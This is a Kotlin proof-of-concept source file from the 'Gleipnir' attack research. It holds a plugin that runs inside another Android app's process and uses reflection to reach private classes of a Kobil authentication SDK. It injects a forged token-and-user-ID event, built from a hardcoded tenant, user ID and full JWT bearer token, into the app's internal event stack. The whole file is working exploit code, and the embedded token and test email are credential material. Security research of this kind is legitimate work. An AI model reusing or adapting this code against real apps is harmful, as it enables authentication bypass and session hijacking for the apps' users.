/*
 * Gleipnir Attack POC - Exploiting the Android process share feature
 * Copyright (C) <2020>  <Sascha Roth>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package org.gleipnir.app.plugins

import android.app.Activity
import android.app.Application
import android.os.Handler
import android.util.Log
import org.gleipnir.app.extendableLoader.ApplicationPaths
import org.gleipnir.app.extendableLoader.IPlugin
import org.gleipnir.app.extendableLoader.LoaderContext

class mPowerPlugin : IPlugin {
    override fun description(): String {
        return "mPowerPlugin"
    }

    override fun onBindApp(loaderContext: LoaderContext): Boolean {
        return false
    }

    override fun onPrepareClassLoader(loaderContext: LoaderContext, classLoader: ClassLoader) {

    }

    override fun onCreateApplication(loaderContext: LoaderContext, application: Application) {

    }

    override fun onLaunchMainActivity(loaderContext: LoaderContext) {

    }

    override fun onNewActivity(loaderContext: LoaderContext, activity: Activity) {

    }

    override fun onPreCreateActivity(loaderContext: LoaderContext, activity: Activity) {

    }

    fun getEventHandler(activity: Activity): Any? {
        Class.forName("com.kobil.ui.z.e", true, activity.classLoader)?.apply {
            val f = getDeclaredField("sKsEventHandlerStack")
            f.isAccessible = true
            val eventStack = f.get(null)
            return eventStack
        }
        return null
    }

    fun postEvent(eventHandler: Any, event: Any, activity: Activity): Any? {
        Class.forName("com.kobil.ui.z.e", true, activity.classLoader)?.apply {
            val f = getDeclaredMethod(
                "o",
                Class.forName(
                    "com.kobil.wrapper.events.EventFrameworkEvent",
                    true,
                    activity.classLoader
                )
            )
            f.isAccessible = true
            return f.invoke(eventHandler, event)
        }
        return null
    }

    fun callGet(future: Any, activity: Activity): Any? {
        val get = future::class.java.getMethod("get")
        return get.invoke(future)
    }

    fun createProvideTokenAndUserIdEvent(
        token: String,
        userIdentifier: Any,
        unknown: Boolean
        , activity: Activity
    ): Any? {
        Class.forName(
            "com.kobil.wrapper.events.ProvideTokenAndUserIdEvent",
            true,
            activity.classLoader
        )?.apply {
            return getConstructor(
                String::class.java,
                Class.forName(
                    "com.kobil.wrapper.events.UserIdentifier", true,
                    activity.classLoader
                ),
                java.lang.Boolean.TYPE
            ).newInstance(token, userIdentifier, unknown)
        }
        return null
    }

    fun createUserIdentifier(tenant: String, userId: String, activity: Activity): Any? {
        Class.forName("com.kobil.wrapper.events.UserIdentifier", true, activity.classLoader)
            ?.apply {
                return getConstructor(String::class.java, String::class.java).newInstance(
                    tenant, userId
                )
            }
        return null
    }

    val started = false

    override fun onPostCreateActivity(loaderContext: LoaderContext, activity: Activity) {
        if (started == false) {
            val started = true
            Handler().postDelayed(object : Runnable {
                override fun run() {
                    try {
                        Log.d("mPowerPlugin", "Send malicious event handler")
                        val userId = createUserIdentifier("birnbach", "d9ad5bb1-21a5-4200-ac7b-398d776e2ecc", activity)
                        val provideToken =
                            createProvideTokenAndUserIdEvent("eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJaenBXb1JIRUFHQTdwRU9GLXg0R0ptRk5qcmNOS3FkOGl6M25ncUNjR3JNIn0.eyJqdGkiOiI0NWNiNWFmMi02YmVhLTQ1NzktODUyMS0wZGU3MzUzYjZkYTAiLCJleHAiOjE1ODkyOTM1NjUsIm5iZiI6MCwiaWF0IjoxNTg5MjkzMjY1LCJpc3MiOiJodHRwczovL2Jpcm5iYWNoLmlhbS1hcGkuc2NwLWs4cy5rOHMuYXdzLmRldi5rb2JpbC5jb20vYXV0aC9yZWFsbXMvYmlybmJhY2giLCJhdWQiOlsiU1NNUyIsImFjY291bnQiXSwic3ViIjoiZDlhZDViYjEtMjFhNS00MjAwLWFjN2ItMzk4ZDc3NmUyZWNjIiwidHlwIjoiQmVhcmVyIiwiYXpwIjoibXBvd2VyLWFwcCIsIm5vbmNlIjoiYnFwMHJiNmZycCIsImF1dGhfdGltZSI6MTU4OTI5MzI2NCwic2Vzc2lvbl9zdGF0ZSI6IjMwYjJiZWJjLTI1MmEtNDFiYy04MTAwLWU4ZDk4NWQ0NGQ3NiIsImFjciI6IjEiLCJhbXIiOiJuYSIsInJlYWxtX2FjY2VzcyI6eyJyb2xlcyI6WyJvZmZsaW5lX2FjY2VzcyIsInVtYV9hdXRob3JpemF0aW9uIl19LCJyZXNvdXJjZV9hY2Nlc3MiOnsiYWNjb3VudCI6eyJyb2xlcyI6WyJtYW5hZ2UtYWNjb3VudCIsIm1hbmFnZS1hY2NvdW50LWxpbmtzIiwidmlldy1wcm9maWxlIl19fSwic2NvcGUiOiJvcGVuaWQgYXN0LWxvZ2luIGFzdC1hY3RpdmF0aW9uIGVtYWlsIHByb2ZpbGUiLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwibmFtZSI6InRlc3QgdXNlcjAxIiwidGVuYW50SWQiOiJiaXJuYmFjaCIsInByZWZlcnJlZF91c2VybmFtZSI6InRlc3R1c2VyMDEiLCJnaXZlbl9uYW1lIjoidGVzdCIsImZhbWlseV9uYW1lIjoidXNlcjAxIiwic3Ntc19yZXNvdXJjZV9hY2Nlc3MiOnsicGVybWlzc2lvbnMiOnsiYXN0LWFjdGl2YXRpb24iOnRydWUsImFzdC1sb2dpbiI6dHJ1ZX19LCJlbWFpbCI6InRlc3R1c2VyMDFAa29iaWwuY29tIn0.UnmkOdCUuZkNN5VW6KNL7c39Jkw8ehyBqNMrJrhjd7hWgaGaDMIPdqff_D_iRA6ldlB7O-1NF-O0VT4Qh6r16mH6t-T9Ou_-XmolJ7ppp9yZY9cP-8FlMLzoQAzMdd82KFIbb0gtr7BIQSypy6WmpIibj3NeIBQ6DM-5fLdL6CSuqSVKSg81yKZRW_GyRB8UdJL2PIYF_8dGVYBgmEwhsxWaZnmT1JkDIMBqVkLLt0TOdjzsqIlciA0rj2d78rEWLfsr1gmD1wEsosyNFQH4Hplur4TaB-AIAlpAdB918CtkgiuEnlXdaypC4zcK6u1b1vJVbvpSbxXwD2IckRortQ", userId!!, true, activity)
                        val eventHandler = getEventHandler(activity)
                        val future = postEvent(eventHandler!!, provideToken!!, activity)
                        val res = callGet(future!!, activity)
                        Log.d("mPowerPlugin", "Successful send event <$res>")
                    } catch (e: Exception) {
                        Log.e("mPowerPlugin", "error", e)
                    }
                }
            }, 10000)
        }
    }

    override fun onError(loaderContext: LoaderContext, exception: Exception) {

    }

    override fun onCreatePaths(loaderContext: LoaderContext, paths: ApplicationPaths): Boolean {

        return false;
    }
}